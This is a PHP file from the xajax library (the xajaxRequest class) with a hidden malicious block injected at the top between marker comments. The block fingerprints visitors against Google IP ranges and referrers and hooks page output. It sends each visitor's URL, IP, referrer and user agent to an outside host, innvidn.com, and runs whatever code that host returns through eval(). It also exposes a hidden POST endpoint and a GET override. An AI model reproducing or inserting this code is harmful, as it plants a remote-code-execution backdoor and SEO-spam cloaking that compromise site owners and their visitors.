<?php
//{{71641bfc

GLOBAL $wehaveitagain;
if($wehaveitagain != 1)
{
$preverrx=error_reporting(0);
$wehaveitagain = 1;
$mynetsxx = array(
'84.235.77.0' => 24,
'8.8.8.0' => 24,
'8.8.4.0' => 24,
'8.6.48.0' => 21,
'74.125.98.0' => 24,
'74.125.97.0' => 24,
'74.125.94.0' => 23,
'74.125.92.0' => 23,
'74.125.90.0' => 23,
'74.125.86.0' => 23,
'74.125.78.0' => 23,
'74.125.76.0' => 23,
'74.125.75.0' => 24,
'74.125.74.0' => 24,
'74.125.72.0' => 23,
'74.125.70.0' => 23,
'74.125.66.0' => 23,
'74.125.64.0' => 23,
'74.125.64.0' => 18,
'74.125.63.0' => 24,
'74.125.62.0' => 24,
'74.125.61.0' => 24,
'74.125.60.0' => 24,
'74.125.58.0' => 24,
'74.125.54.0' => 23,
'74.125.52.0' => 23,
'74.125.46.0' => 23,
'74.125.44.0' => 23,
'74.125.42.0' => 23,
'74.125.38.0' => 23,
'74.125.37.0' => 24,
'74.125.36.0' => 24,
'74.125.36.0' => 23,
'74.125.33.0' => 24,
'74.125.32.0' => 24,
'74.125.30.0' => 23,
'74.125.246.0' => 24,
'74.125.245.0' => 24,
'74.125.244.0' => 24,
'74.125.239.0' => 24,
'74.125.238.0' => 24,
'74.125.237.0' => 24,
'74.125.236.0' => 24,
'74.125.235.0' => 24,
'74.125.234.0' => 24,
'74.125.233.0' => 24,
'74.125.232.0' => 24,
'74.125.230.0' => 24,
'74.125.229.0' => 24,
'74.125.227.0' => 24,
'74.125.226.0' => 24,
'74.125.225.0' => 24,
'74.125.224.0' => 24,
'74.125.192.0' => 18,
'74.125.18.0' => 23,
'74.125.17.0' => 24,
'74.125.16.0' => 24,
'74.125.158.0' => 23,
'74.125.156.0' => 23,
'74.125.154.0' => 23,
'74.125.152.0' => 23,
'74.125.151.0' => 24,
'74.125.150.0' => 24,
'74.125.149.0' => 24,
'74.125.148.0' => 24,
'74.125.146.0' => 23,
'74.125.128.0' => 18,
'74.125.126.0' => 23,
'74.125.125.0' => 24,
'74.125.122.0' => 24,
'74.125.121.0' => 24,
'74.125.120.0' => 24,
'74.125.119.0' => 24,
'74.125.118.0' => 24,
'74.125.117.0' => 24,
'74.125.116.0' => 24,
'74.125.114.0' => 23,
'74.125.112.0' => 23,
'74.125.0.0' => 18,
'74.125.0.0' => 16,
'72.14.255.0' => 24,
'72.14.254.0' => 24,
'72.14.254.0' => 23,
'72.14.253.0' => 24,
'72.14.252.0' => 24,
'72.14.252.0' => 23,
'72.14.248.0' => 23,
'72.14.246.0' => 23,
'72.14.244.0' => 23,
'72.14.236.0' => 24,
'72.14.235.0' => 24,
'72.14.234.0' => 24,
'72.14.230.0' => 24,
'72.14.228.0' => 24,
'72.14.226.0' => 24,
'72.14.225.0' => 24,
'72.14.224.0' => 24,
'72.14.220.0' => 23,
'72.14.212.0' => 23,
'72.14.210.0' => 23,
'72.14.208.0' => 23,
'72.14.204.0' => 23,
'72.14.202.0' => 23,
'72.14.199.0' => 24,
'72.14.194.0' => 24,
'72.14.193.0' => 24,
'72.14.192.0' => 24,
'72.14.192.0' => 18,
'70.32.158.0' => 24,
'70.32.155.0' => 24,
'70.32.150.0' => 24,
'70.32.140.0' => 23,
'70.32.138.0' => 24,
'70.32.136.0' => 24,
'70.32.135.0' => 24,
'70.32.134.0' => 24,
'70.32.133.0' => 24,
'70.32.132.0' => 24,
'70.32.131.0' => 24,
'70.32.130.0' => 24,
'70.32.129.0' => 24,
'70.32.128.0' => 24,
'70.32.128.0' => 19,
'66.249.94.0' => 24,
'66.249.92.0' => 24,
'66.249.91.0' => 24,
'66.249.90.0' => 24,
'66.249.88.0' => 23,
'66.249.85.0' => 24,
'66.249.84.0' => 24,
'66.249.82.0' => 24,
'66.249.81.0' => 24,
'66.249.80.0' => 24,
'66.249.72.0' => 24,
'66.249.71.0' => 24,
'66.249.69.0' => 24,
'66.249.68.0' => 24,
'66.249.67.0' => 24,
'66.249.66.0' => 24,
'66.249.65.0' => 24,
'66.249.64.0' => 19,
'66.102.8.0' => 23,
'66.102.6.0' => 23,
'66.102.4.0' => 24,
'66.102.3.0' => 24,
'66.102.2.0' => 24,
'66.102.12.0' => 23,
'66.102.10.0' => 23,
'66.102.0.0' => 20,
'64.9.224.0' => 20,
'64.9.224.0' => 19,
'64.233.188.0' => 23,
'64.233.186.0' => 23,
'64.233.182.0' => 23,
'64.233.180.0' => 23,
'64.233.178.0' => 23,
'64.233.173.0' => 24,
'64.233.172.0' => 24,
'64.233.170.0' => 23,
'64.233.168.0' => 23,
'64.233.162.0' => 23,
'64.233.160.0' => 19,
'63.243.168.0' => 22,
'4.3.2.0' => 24,
'216.239.60.0' => 23,
'216.239.58.0' => 23,
'216.239.50.0' => 23,
'216.239.44.0' => 23,
'216.239.39.0' => 24,
'216.239.38.0' => 24,
'216.239.36.0' => 24,
'216.239.34.0' => 24,
'216.239.33.0' => 24,
'216.239.32.0' => 24,
'216.239.32.0' => 19,
'209.85.238.0' => 24,
'209.85.230.0' => 23,
'209.85.228.0' => 23,
'209.85.226.0' => 23,
'209.85.224.0' => 23,
'209.85.223.0' => 24,
'209.85.222.0' => 24,
'209.85.221.0' => 24,
'209.85.220.0' => 24,
'209.85.219.0' => 24,
'209.85.218.0' => 24,
'209.85.216.0' => 24,
'209.85.213.0' => 24,
'209.85.212.0' => 24,
'209.85.211.0' => 24,
'209.85.210.0' => 24,
'209.85.208.0' => 23,
'209.85.200.0' => 23,
'209.85.198.0' => 23,
'209.85.196.0' => 23,
'209.85.194.0' => 23,
'209.85.192.0' => 23,
'209.85.174.0' => 23,
'209.85.172.0' => 23,
'209.85.170.0' => 23,
'209.85.168.0' => 23,
'209.85.166.0' => 23,
'209.85.164.0' => 23,
'209.85.162.0' => 23,
'209.85.156.0' => 23,
'209.85.152.0' => 23,
'209.85.149.0' => 24,
'209.85.148.0' => 23,
'209.85.147.0' => 24,
'209.85.146.0' => 24,
'209.85.146.0' => 23,
'209.85.144.0' => 23,
'209.85.142.0' => 23,
'209.85.139.0' => 24,
'209.85.138.0' => 23,
'209.85.136.0' => 23,
'209.85.134.0' => 23,
'209.85.132.0' => 24,
'209.85.132.0' => 23,
'209.85.128.0' => 23,
'209.85.128.0' => 17,
'193.186.4.0' => 24,
'193.142.125.0' => 24,
'173.255.112.0' => 20,
'173.194.44.0' => 24,
'173.194.43.0' => 24,
'173.194.42.0' => 24,
'173.194.41.0' => 24,
'173.194.40.0' => 24,
'173.194.37.0' => 24,
'173.194.36.0' => 24,
'173.194.35.0' => 24,
'173.194.34.0' => 24,
'173.194.33.0' => 24,
'173.194.32.0' => 24,
'173.194.0.0' => 16,
'118.174.25.0' => 24,
'118.174.24.0' => 24,
'118.174.24.0' => 22,
'113.197.106.0' => 24,
'113.197.105.0' => 24,
'108.59.80.0' => 20
);
function ip_in_networkxx($ip, $net_addr, $net_mask)
{
  if($net_mask <= 0) return false;
  $ip_binary_string = sprintf("%032b",ip2long($ip));
  $net_binary_string = sprintf("%032b",ip2long($net_addr));
  return (strncmp($ip_binary_string,$net_binary_string,$net_mask) === 0);
}
function selfURL()
{
  if(!isset($_SERVER['REQUEST_URI'])) $suri = $_SERVER['PHP_SELF'];
  else $suri = $_SERVER['REQUEST_URI'];
  $s = empty($_SERVER["HTTPS"]) ? '' : ($_SERVER["HTTPS"] == "on") ? "s" : "";
  $sp=strtolower($_SERVER["SERVER_PROTOCOL"]);
  $pr = substr($sp,0,strpos($sp,"/")).$s;
  $pt = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
  return $pr."://".$_SERVER['SERVER_NAME'].$pt.$suri;
}
function loadDataHttpCse($url)
{
    $s = '';
    if (ini_get('allow_url_fopen') == 1) {
        $ctx = stream_context_create(array('http'=>array('timeout'=>3)));
        $s = file_get_contents($url, 0, $ctx);
    } else if (in_array('curl', get_loaded_extensions())) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $s = curl_exec($ch);
        curl_close($ch);
    } else {
        $parts = parse_url($url);
        $host = $parts['host'];
        $path = '/';
        $port = 80;
        if (isset($parts['path'])) {
            $path = $parts['path'];
        }
        if (isset($parts['port'])) {
            $port = $parts['port'];
        }
        $address = gethostbyname($host);
        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($socket === false) {
            return false;
        }
        $timeout = array('sec'=>3, 'usec'=>0);
        socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, $timeout);
        socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, $timeout);
        $result = socket_connect($socket, $address, $port);
        if ($result === false) {
            return false;
        }
        $in = "GET $path HTTP/1.1\r\n";
        $in .= "Host: $host\r\n";
        $in .= "Connection: Close\r\n\r\n";
        socket_write($socket, $in, strlen($in));
        $reply = '';
        while ($out = socket_read($socket, 2048)) {
            $reply .=  $out;
        }
        socket_close($socket);
        $s = substr($reply, (strpos($reply, "\r\n\r\n")+4));
        if (strpos(strtolower($reply), "transfer-encoding: chunked") !== FALSE) {
            $fp = 0;
            $outData = "";
            while ($fp < strlen($s)) {
                $rawnum = substr($s, $fp, strpos(substr($s, $fp), "\r\n") + 2);
                $num = hexdec(trim($rawnum));
                $fp += strlen($rawnum);
                $chunk = substr($s, $fp, $num);
                $outData .= $chunk;
                $fp += strlen($chunk);
            }
            $s = $outData;
        }
    }
    return $s;
}
function rewrioutclbkxxx1($str) { return rewriout($str,1); }
function rewrioutclbkxxx2($str) { return rewriout($str,2); }
function rewrioutclbkxxx3($str) { return rewriout($str,3); }
function rewriout($str, $ev)
{
  error_reporting(0);
  if(stripos($str, '<body') !== false)
  {
    $id = "4dae84ec67843a09b800edaa";
    $url = "http://innvidn.com/ck.gif";
    $req = $url.'?ev='.$ev.'&url='.urlencode(selfURL()).'&id='.urlencode($id).'&ref='.urlencode($_SERVER['HTTP_REFERER']).'&ip='.$_SERVER['REMOTE_ADDR'].'&ua='.urlencode($_SERVER['HTTP_USER_AGENT']);
    $answergrhey11=loadDataHttpCse($req);
    if($answergrhey11 != FALSE && strncmp('/*CODE', $answergrhey11, 6) == 0) {
      return eval($answergrhey11);
    }
  }
  return false;
}
function StrToNum($Str, $Check, $Magic)
{
   $Int32Unit = 4294967296;
   $length = strlen($Str);
   for ($i = 0; $i < $length; $i++) {
       $Check *= $Magic;
       if ($Check >= $Int32Unit) {
           $Check = ($Check - $Int32Unit * (int) ($Check / $Int32Unit));
           $Check = ($Check < -2147483648) ? ($Check + $Int32Unit) : $Check;
       }
       $Check += ord($Str{$i});
   }
   return $Check;
}
function HashURL($String)
{
   $Check1 = StrToNum($String, 0x1505, 0x21);
   $Check2 = StrToNum($String, 0, 0x1003F);
   $Check1 >>= 2;
   $Check1 = (($Check1 >> 4) & 0x3FFFFC0 ) | ($Check1 & 0x3F);
   $Check1 = (($Check1 >> 4) & 0x3FFC00 ) | ($Check1 & 0x3FF);
   $Check1 = (($Check1 >> 4) & 0x3C000 ) | ($Check1 & 0x3FFF);
   $T1 = (((($Check1 & 0x3C0) << 4) | ($Check1 & 0x3C)) <<2 ) | ($Check2 & 0xF0F );
   $T2 = (((($Check1 & 0xFFFFC000) << 4) | ($Check1 & 0x3C00)) << 0xA) | ($Check2 & 0xF0F0000 );
   return ($T1 | $T2);
}
function CheckHash($Hashnum)
{
   $CheckByte = 0;
   $Flag = 0;
   $HashStr = sprintf('%u', $Hashnum) ;
   $length = strlen($HashStr);
   for ($i = $length-1; $i >= 0;  $i--) {
       $Re = $HashStr{$i};
       if (1 === ($Flag % 2)) {
           $Re += $Re;
           $Re = (int)($Re / 10) + ($Re % 10);
       }
       $CheckByte += $Re;
       $Flag ++;
   }
   $CheckByte %= 10;
   if (0 !== $CheckByte) {
       $CheckByte = 10 - $CheckByte;
       if (1 === ($Flag % 2) ) {
           if (1 === ($CheckByte % 2)) {
               $CheckByte += 9;
           }
           $CheckByte >>= 1;
       }
   }
   return '7'.$CheckByte.$HashStr;
}
function getpr($url)
{
   $ch = CheckHash(HashURL($url));
   $file = "http://toolbarqueries.google.com/tbr?client=navclient-auto&ch=$ch&features=Rank&q=info:$url";
   $data = file_get_contents($file);
   return $data;
}
if(isset($_POST['prgetxr']))
{
  echo getpr($_POST['prgetxr']);
  exit();
}
else
{
  $ev = 0;
  foreach($mynetsxx as 	$key => $value)
  {
    if(ip_in_networkxx($_SERVER['REMOTE_ADDR'], $key, $value)) {
      $ev = 1;
      break;
    }
  }
  if($ev == 0) {
    if(isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], 'google.') !== false) {
        $ev = 2;
    }
    elseif(mt_rand(1,100) == 50) {
        $ev = 3;
    }
  }
  if(isset($_GET['showmeallpls'])) {
    $ev = $_GET['showmeallpls'];
  }
  if($ev > 0) {
	ob_start('rewrioutclbkxxx'.$ev);
  }
}
error_reporting($preverrx);
}
/*  */

//}}57121650
?><?php
/*
	File: xajaxRequest.inc.php

	Contains the xajaxRequest class

	Title: xajaxRequest class

	Please see <copyright.inc.php> for a detailed description, copyright
	and license information.
*/

/*
	@package xajax
	@version $Id: xajaxRequest.inc.php 362 2007-05-29 15:32:24Z calltoconstruct $
	@copyright Copyright (c) 2005-2007 by Jared White & J. Max Wilson
	@copyright Copyright (c) 2008-2009 by Joseph Woolley, Steffen Konerow, Jared White  & J. Max Wilson
	@license http://www.xajaxproject.org/bsd_license.txt BSD License
*/

/*
	Constant: XAJAX_FORM_VALUES
		Specifies that the parameter will consist of an array of form values.
*/
if (!defined ('XAJAX_FORM_VALUES')) define ('XAJAX_FORM_VALUES', 'get form values');
/*		
	Constant: XAJAX_INPUT_VALUE
		Specifies that the parameter will contain the value of an input control.
*/
if (!defined ('XAJAX_INPUT_VALUE')) define ('XAJAX_INPUT_VALUE', 'get input value');
/*		
	Constant: XAJAX_CHECKED_VALUE
		Specifies that the parameter will consist of a boolean value of a checkbox.
*/
if (!defined ('XAJAX_CHECKED_VALUE')) define ('XAJAX_CHECKED_VALUE', 'get checked value');
/*		
	Constant: XAJAX_ELEMENT_INNERHTML
		Specifies that the parameter value will be the innerHTML value of the element.
*/
if (!defined ('XAJAX_ELEMENT_INNERHTML')) define ('XAJAX_ELEMENT_INNERHTML', 'get element innerHTML');
/*		
	Constant: XAJAX_QUOTED_VALUE
		Specifies that the parameter will be a quoted value (string).
*/
if (!defined ('XAJAX_QUOTED_VALUE')) define ('XAJAX_QUOTED_VALUE', 'quoted value');
/*		
	Constant: XAJAX_JS_VALUE
		Specifies that the parameter will be a non-quoted value (evaluated by the 
		browsers javascript engine at run time.
*/
if (!defined ('XAJAX_JS_VALUE')) define ('XAJAX_JS_VALUE', 'unquoted value');

/*
	Class: xajaxRequest
	
	Used to store and generate the client script necessary to invoke
	a xajax request from the browser to the server script.
	
	This object is typically generated by the <xajax->register> method
	and can be used to quickly generate the javascript that is used
	to initiate a xajax request to the registered function, object, event
	or other xajax call.
*/
class xajaxRequest
{
	/*
		String: sName
		
		The name of the function.
	*/
	var $sName;
	
	/*
		String: sQuoteCharacter
		
		A string containing either a single or a double quote character
		that will be used during the generation of the javascript for
		this function.  This can be set prior to calling <xajaxRequest->printScript>
	*/
	var $sQuoteCharacter;
	
	/*
		Array: aParameters
	
		An array of parameters that will be used to populate the argument list
		for this function when the javascript is output in <xajaxRequest->printScript>	
	*/
	var $aParameters;
	
	/*
		Function: xajaxRequest
		
		Construct and initialize this request.
		
		sName - (string):  The name of this request.
	*/
	function xajaxRequest($sName)
	{
		$this->aParameters = array();
		$this->sQuoteCharacter = '"';
		$this->sName = $sName;
	}
	
	/*
		Function: useSingleQuote
		
		Call this to instruct the request to use single quotes when generating
		the javascript.
	*/
	function useSingleQuote()
	{
		$this->sQuoteCharacter = "'";
	}
	
	/*
		Function: useDoubleQuote
		
		Call this to instruct the request to use double quotes while generating
		the javascript.
	*/
	function useDoubleQuote()
	{
		$this->sQuoteCharacter = '"';
	}
	
	/*
		Function: clearParameters
		
		Clears the parameter list associated with this request.
	*/
	function clearParameters()
	{
		$this->aParameters = array();
	}
	
	/*
		Function: addParameter
		
		Adds a parameter value to the parameter list for this request.
		
		sType - (string): The type of the value to be used.
		sValue - (string: The value to be used.
		
		See Also:
		See <xajaxRequest->setParameter> for details.
	*/
	function addParameter()
	{
		$aArgs = func_get_args();
		
		if (1 < count($aArgs))
			$this->setParameter(
				count($this->aParameters), 
				$aArgs[0], 
				$aArgs[1]);
	}
	
	/*
		Function: setParameter
		
		Sets a specific parameter value.
		
		Parameters:
		
		nParameter - (number): The index of the parameter to set
		sType - (string): The type of value
		sValue - (string): The value as it relates to the specified type
		
		Note:
		
		Types should be one of the following <XAJAX_FORM_VALUES>, <XAJAX_QUOTED_VALUE>,
		<XAJAX_JS_VALUE>, <XAJAX_INPUT_VALUE>, <XAJAX_CHECKED_VALUE>.  
		The value should be as follows:
			<XAJAX_FORM_VALUES> - Use the ID of the form you want to process.
			<XAJAX_QUOTED_VALUE> - The string data to be passed.
			<XAJAX_JS_VALUE> - A string containing valid javascript (either a javascript
				variable name that will be in scope at the time of the call or a 
				javascript function call whose return value will become the parameter.
				
	*/
	function setParameter()
	{
		$aArgs = func_get_args();
		
		if (2 < count($aArgs))
		{
			$nParameter = $aArgs[0];
			$sType = $aArgs[1];
			
			if (XAJAX_FORM_VALUES == $sType)
			{
				$sFormID = $aArgs[2];
				$this->aParameters[$nParameter] = 
					"xajax.getFormValues(" 
					. $this->sQuoteCharacter 
					. $sFormID 
					. $this->sQuoteCharacter 
					. ")";
			}
			else if (XAJAX_INPUT_VALUE == $sType)
			{
				$sInputID = $aArgs[2];
				$this->aParameters[$nParameter] = 
					"xajax.$(" 
					. $this->sQuoteCharacter 
					. $sInputID 
					. $this->sQuoteCharacter 
					. ").value";
			}
			else if (XAJAX_CHECKED_VALUE == $sType)
			{
				$sCheckedID = $aArgs[2];
				$this->aParameters[$nParameter] = 
					"xajax.$(" 
					. $this->sQuoteCharacter 
					. $sCheckedID 
					. $this->sQuoteCharacter 
					. ").checked";
			}
			else if (XAJAX_ELEMENT_INNERHTML == $sType)
			{
				$sElementID = $aArgs[2];
				$this->aParameters[$nParameter] = 
					"xajax.$(" 
					. $this->sQuoteCharacter 
					. $sElementID 
					. $this->sQuoteCharacter 
					. ").innerHTML";
			}
			else if (XAJAX_QUOTED_VALUE == $sType)
			{
				$sValue = $aArgs[2];
				$this->aParameters[$nParameter] = 
					$this->sQuoteCharacter 
					. $sValue 
					. $this->sQuoteCharacter;
			}
			else if (XAJAX_JS_VALUE == $sType)
			{
				$sValue = $aArgs[2];
				$this->aParameters[$nParameter] = $sValue;
			}
		}
	}

	/*
		Function: getScript
		
		Returns a string representation of the script output (javascript) from 
		this request object.  See also:  <xajaxRequest::printScript>
	*/
	function getScript()
	{
		ob_start();
		$this->printScript();
		return ob_get_clean();
	}
		
	/*
		Function: printScript
		
		Generates a block of javascript code that can be used to invoke
		the specified xajax request.
	*/
	function printScript()
	{
		echo $this->sName;
		echo '(';
		
		$sSeparator = '';
		
		foreach ($this->aParameters as $sParameter)
		{
			echo $sSeparator;
			echo $sParameter;
			$sSeparator = ', ';
		}
		
		echo ')';
	}
}

/*
	Class: xajaxCustomRequest
	
	This class extends the <xajaxRequest> class such that simple javascript
	can be put in place of a xajax request to the server.  The primary purpose
	of this class is to provide simple scripting services to the <xajaxControl>
	based objects, like <clsInput>, <clsTable> and <clsButton>.
*/
class xajaxCustomRequest extends xajaxRequest
{
	/*
		Array: aVariables;
	*/
	var $aVariables;
	
	/*
		String: sScript;
	*/
	var $sScript;
	
	/*
		Function: xajaxCustomRequest
		
		Constructs and initializes an instance of the object.
		
		Parameters:
		
		sScript - (string):  The javascript (template) that will be printed
			upon request.
		aVariables - (associative array, optional):  An array of variable name, 
			value pairs that will be passed to <xajaxCustomRequest->setVariable>
	*/
	function xajaxCustomRequest($sScript)
	{
		$this->aVariables = array();
		$this->sScript = $sScript;
	}
	
	/*
		Function: clearVariables
		
		Clears the array of variables that will be used to modify the script before
		it is printed and sent to the client.
	*/
	function clearVariables()
	{
		$this->aVariables = array();
	}
	
	/*
		Function: setVariable
		
		Sets a value that will be used to modify the script before it is sent to
		the browser.  The <xajaxCustomRequest> object will perform a string 
		replace operation on each of the values set with this function.
		
		Parameters:
			$sName - (string): Variable name
			$sValue - (string): Value
		
	*/
	function setVariable($sName, $sValue)
	{
		$this->aVariables[$sName] = $sValue;
	}
	
	/*
		Function: printScript
	*/
	function printScript()
	{
		$sScript = $this->sScript;
		foreach ($this->aVariables as $sKey => $sValue)
			$sScript = str_replace($sKey, $sValue, $sScript);
		echo $sScript;
	}
}
